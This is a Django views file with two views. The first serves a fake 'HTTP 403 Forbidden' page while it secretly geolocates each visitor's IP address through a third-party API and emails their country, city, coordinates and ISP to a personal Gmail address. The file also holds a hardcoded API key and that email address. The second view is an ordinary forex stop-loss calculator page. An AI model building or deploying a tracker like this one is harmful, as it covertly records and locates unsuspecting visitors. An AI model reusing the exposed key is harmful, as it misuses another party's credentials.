import datetime
from django.shortcuts import render
from django.http import HttpResponse
from django.core.mail import send_mail
import requests


def send_custom_email(message):
    subject = "IP through"
    sender_email = "ddennispk@gmail.com"
    receiver_email = "ddennispk@gmail.com"

    send_mail(subject, message, sender_email, [receiver_email])


def index(request):
    # Get the client's IP address from the request object
    client_ip = get_client_ip(request)
    response = requests.get(
        f"https://ip-geolocation.whoisxmlapi.com/api/v1?apiKey=at_5NSWrCtZ09MZGrEvpERQ0e1LdRPyp&ipAddress={client_ip}")

    json_data = response.json()

    text_file = f'''
        {datetime.datetime.now().day} {datetime.date(1900, datetime.datetime.now().month, 1).strftime('%B')}, {datetime.datetime.now().year}
        {datetime.datetime.now().time().strftime('%I:%M %p')}
        ip: {json_data['ip']}
        -----------------------------------------------
        Location
        Country: {json_data['location']['country']}
        Region: {json_data['location']['region']}
        City: {json_data['location']['city']}
        Latitude: {json_data['location']['lat']}
        Longitude: {json_data['location']['lng']}
        ------------------------------------------------
        ISP
        Name: {json_data['isp']}
        Connection Type: {json_data['connectionType']}
    '''

    print(text_file)

    send_custom_email(message=text_file)

    return HttpResponse(
        '''
        <style>
        @import url("https://fonts.googleapis.com/css?family=Share+Tech+Mono|Montserrat:700");

* {
    margin: 0;
    padding: 0;
    border: 0;
    font-size: 100%;
    font: inherit;
    vertical-align: baseline;
    box-sizing: border-box;
    color: inherit;
}

body {
    background-image: linear-gradient(120deg, #4f0088 0%, #000000 100%);
    height: 100vh;
}

h1 {
    font-size: 45vw;
    text-align: center;
    position: fixed;
    width: 100vw;
    z-index: 1;
    color: #ffffff26;
    text-shadow: 0 0 50px rgba(0, 0, 0, 0.07);
    top: 50%;
    transform: translateY(-50%);
    font-family: "Montserrat", monospace;
}

div {
    background: rgba(0, 0, 0, 0);
    width: 70vw;
    position: relative;
    top: 50%;
    transform: translateY(-50%);
    margin: 0 auto;
    padding: 30px 30px 10px;
    box-shadow: 0 0 150px -20px rgba(0, 0, 0, 0.5);
    z-index: 3;
}

P {
    font-family: "Share Tech Mono", monospace;
    color: #f5f5f5;
    margin: 0 0 20px;
    font-size: 17px;
    line-height: 1.2;
}

span {
    color: #f0c674;
}

i {
    color: #8abeb7;
}

div a {
    text-decoration: none;
}

b {
    color: #81a2be;
}

a.avatar {
    position: fixed;
    bottom: 15px;
    right: -100px;
    animation: slide 0.5s 4.5s forwards;
    display: block;
    z-index: 4
}

a.avatar img {
    border-radius: 100%;
    width: 44px;
    border: 2px solid white;
}

@keyframes slide {
    from {
        right: -100px;
        transform: rotate(360deg);
        opacity: 0;
    }
    to {
        right: 15px;
        transform: rotate(0deg);
        opacity: 1;
    }
}

        </style>
            <h1>403</h1>
<div><p>> <span>ERROR CODE</span>: "<i>HTTP 403 Forbidden</i>"</p>
<p>> <span>ERROR DESCRIPTION</span>: "<i>Access Denied. You Do Not Have The Permission To Access This Server</i>"</p>
<p>> <span>ERROR POSSIBLY CAUSED BY</span>: [<b>Unknown Member, Intruder, Kicked Out, Opps</b>]</p>
<p>> <span>Contact Any Of The Upper 100 To Gain Access 😈</span></p>
<p>> <span>HAVE A NICE DAY :-)</span></p>
</div>  
       <script>
            var str = document.getElementsByTagName('div')[0].innerHTML.toString();
var i = 0;
document.getElementsByTagName('div')[0].innerHTML = "";

setTimeout(function() {
    var se = setInterval(function() {
        i++;
        document.getElementsByTagName('div')[0].innerHTML = str.slice(0, i) + "|";
        if (i == str.length) {
            clearInterval(se);
            document.getElementsByTagName('div')[0].innerHTML = str;
        }
    }, 10);
},0);

        </script>
        '''
    )


def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip


def forex_calc_stop_loss_price(request):
    return HttpResponse('''
    <!DOCTYPE html>
<html>
<head>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
    body {
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        background-color: #f5f5f5;
        margin: 0;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
    }

    .container {
        max-width: 100%;
        width: 90%;
        background-color: #ffffff;
        border: 1px solid #e0e0e0;
        border-radius: 5px;
        padding: 20px;
        box-shadow: 0px 2px 4px rgba(0, 0, 0, 0.1);
         min-height: 450px;
    }

    h1 {
        text-align: center;
        color: #333;
    }

    label, input {
        display: block;
        margin-bottom: 15px;
        font-weight: 600
    }

    input {
        width: 94%;
        padding: 10px;
        border: 1px solid #e0e0e0;
        border-radius: 3px;
        outline: none;
        font-size: 16px;
    }

    button {
        display: block;
        margin: 20px auto;
        background-color: #007BFF;
        color: #fff;
        border: none;
        padding: 10px 20px;
        border-radius: 3px;
        cursor: pointer;
        transition: background-color 0.3s;
    }

    p {
        text-align: center;
        font-weight: bold;
        color: #333;
    }
    
    .button-group {
            display: flex;
        }

        .option-button {
            border: 1px solid #e0e0e0;
            background-color: #fff;
            color: #333;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            margin: 0 10px;
            transition: background-color 0.3s, color 0.3s;
        }


        .option-button.buy.selected {
            background-color: #4caf5080;
            color: #fff;
        }
        .option-button.sell.selected {
            background-color: #ff000075;
            color: #fff;
        }
        
         /* Modal Styles */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            justify-content: center;
            align-items: center;
        }

        .modal-content {
            background-color: #fff;
            border: 1px solid #e0e0e0;
            border-radius: 5px;
            width: 18em;
            height: 15em;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 0 10px;
        }

        .modal-button {
            background-color: #007BFF;
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 3px;
            cursor: pointer;
            margin-top: 20px;
        }
    @media (min-width: 768px) {
        .container {
            max-width: 400px;
        }
        
        .modal-content {
            padding: 10px;
        }
    }
</style>
</head>
<body>
    <div class="container">
        <h1>Stop Loss Calculator</h1>
        
        <label>What's Happening?</label>
        <div class="button-group">
            <button class="option-button buy selected" id="buyOption">Buying</button>
            <button class="option-button sell" id="sellOption">Selling</button>
        </div><br>
        
        <label for="entry_point">Entry Point:</label>
        <input type="text" id="entry_point" placeholder="Enter entry point" required>
        <br>

        <label for="position_size">Position Size:</label>
        <input type="text" id="position_size" placeholder="Enter position size" required>
        <br>

        <label for="max_loss">Maximum Loss ($):</label>
        <input type="text" id="max_loss" placeholder="Enter the amount you are willing to lose" required>
        <br>

        <button onclick="calculateStopLoss()">Calculate Stop Loss</button>
        <br>
    </div>
        
        <!-- Result Modal -->
    <div id="resultModal" class="modal">
        <div class="modal-content">
            <p id="result"></p>
            <button class="modal-button" onclick="closeResultModal()">Close</button>
        </div>
    </div>
    

    <script>
    document.getElementById("buyOption").addEventListener("click", function() {
            this.classList.add("selected");
            document.getElementById("sellOption").classList.remove("selected");
            document.getElementById("result").innerHTML = "";
        });

    document.getElementById("sellOption").addEventListener("click", function() {
        this.classList.add("selected");
        document.getElementById("buyOption").classList.remove("selected");
        document.getElementById("result").innerHTML = "";
    });
         function calculateStopLoss() {
         const trade_type = document.querySelector(".option-button.selected").id === "buyOption" ? "buy" : "sell";
        const entry_point = parseFloat(document.getElementById("entry_point").value);
        const position_size = parseFloat(document.getElementById("position_size").value);
        const max_loss = parseFloat(document.getElementById("max_loss").value);
        
        console.log(entry_point, typeof entry_point)
        console.log(position_size, typeof position_size)
        console.log(max_loss, typeof max_loss)

        if (position_size === 0) {
            document.getElementById("result").innerHTML = "Position size cannot be zero.";
        } else {
            let stop_loss_price;
            if (trade_type === "buy") {
                stop_loss_price = entry_point - (max_loss / (position_size * 100000));
            } else if (trade_type === "sell") {
                stop_loss_price = entry_point + (max_loss / (position_size * 100000));
            } else {
                document.getElementById("result").innerHTML = "Invalid trade type selected.";
                return;
            }
            document.getElementById("result").innerHTML = `To limit your maximum loss to <b style="color:red">$${max_loss.toFixed(2)}</b>, set the Stop Loss price at <b style="color:red">${stop_loss_price.toFixed(4)}</b>`;
            document.getElementById("resultModal").style.display = "flex";
        }
    }
    
    function closeResultModal() {
            // Close the result modal
            document.getElementById("resultModal").style.display = "none";
        }
</script>
</body>
</html>
''')
